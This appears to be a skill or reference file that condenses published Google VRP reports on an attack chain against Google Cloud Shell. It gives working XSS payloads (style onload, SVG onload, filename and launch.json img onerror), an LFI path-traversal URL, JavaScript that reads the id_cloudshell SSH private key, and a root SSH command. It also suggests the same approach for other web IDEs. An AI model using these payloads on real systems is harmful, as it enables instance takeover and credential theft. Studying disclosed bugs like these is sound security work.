---
name: bughunters-cloud-shell
description: Personal Google VRP reports by omespino — Google Cloud Shell instance takeover chain. XSS via .md style onload + LFI via file:// URI in /files/ endpoint + container escape via ../ path traversal + SSH private key exfiltration + root SSH to devshell-vm. XSS via SVG onload (Safari) with same SSH key chain. XSS via filename injection in Theia Debug Console launch.json (img onerror in program field). Delivery via "Open in Google Cloud Shell" button. GitHub: github.com/omespino/gcs_instace_takeover. Spanish triggers — "cloud shell google", "cloud shell xss", "cloud shell lfi", "devshell", "theia editor", "cloud shell ssh", "cloud shell takeover", "open in cloud shell", "cloud shell instancia".
---

## Reports: Cloud Shell XSS + Takeover chain (omespino)

---

### Report 1 — Cloud Shell instance takeover (root)
**Chain:** XSS (.md preview) → LFI (file:// /files/) → container escape (../) → SSH key exfil → root SSH
**GitHub PoC:** https://github.com/omespino/gcs_instace_takeover

#### Step 1 — XSS in .md preview
```
<style onload=alert(document.domain)>
```
Triggers in Theia editor preview (Firefox, CSP off for .md).

#### Step 2 — LFI + container escape
```
https://XXX-dot-XXXXXXXX-dot-devshell.appspot.com/files/?uri=file:///path
# Container escape: ../
https://.../files/?uri=file://../../../etc/hosts
```

#### Step 3 — SSH key exfiltration
```javascript
var container_url = 'https://' + location.host + '/files/?uri=../id_cloudshell';
fetch(container_url)
  .then(r => r.json())
  .then(data => fetch('https://' + location.host + '/files/download/?id=' + data.id))
  .then(r => r.text())
  .then(key => alert(key));
```

#### Step 4 — Build SSH target + root SSH
```bash
# /etc/hosts reveals: cs-6000-devshell-vm-XXXX-XXXX-XXXX-XXXX
# Remove cs-6000- prefix, add .cloudshell.dev
ssh -i id_cloudshell -p 6000 root@devshell-vm-XXXX-XXXX-XXXX-XXXX.cloudshell.dev
```

#### API chain
```
GET /files/?uri=/etc/ssh/keys/authorized_keys  →  { "id": "xxxxx" }
GET /files/download/?id=xxxxx                  →  file content
```

---

### Report 20 — XSS via SVG onload (Safari) + same SSH chain
**Browser:** Safari (macOS Catalina) — blocks third-party cookies → Cloud Shell opens in new window
```xml
<svg onload="{
  var url = 'https://' + location.host + '/files/?uri=../id_cloudshell';
  fetch(url).then(r=>r.json()).then(d=>fetch('https://'+location.host+'/files/download/?id='+d.id)).then(r=>r.text()).then(k=>alert(k));
}" xmlns="http://www.w3.org/2000/svg"></svg>
```

#### All XSS vectors in Cloud Shell
| Vector | Trigger | Browser | File |
|---|---|---|---|
| `<style onload>` | .md preview | Firefox | xss.md |
| Filename `<img onerror>` in launch.json | Debug Console | Any | `<img onerror=alert(0)>.js` |
| SVG `onload` | .svg preview | Safari | alert.svg |
| `xlink:href` data URI | User click | Any | SVG with link |

---

### Report 17 — XSS via filename injection in Debug Console (launch.json)
```bash
touch "<img src=0 onerror=alert(0)>.js"
```
```json
{
  "configurations": [{
    "type": "node",
    "request": "launch",
    "name": "XSS",
    "program": "${workspaceFolder}/<img src=0 onerror=alert(0)>.js"
  }]
}
```
Theia Debug Console renders `program` field as HTML without sanitization.

**Generalization:** Web IDEs (Theia, VS Code Web, Cloud9, Jupyter) that render filenames as HTML in file explorers or debugger panels.
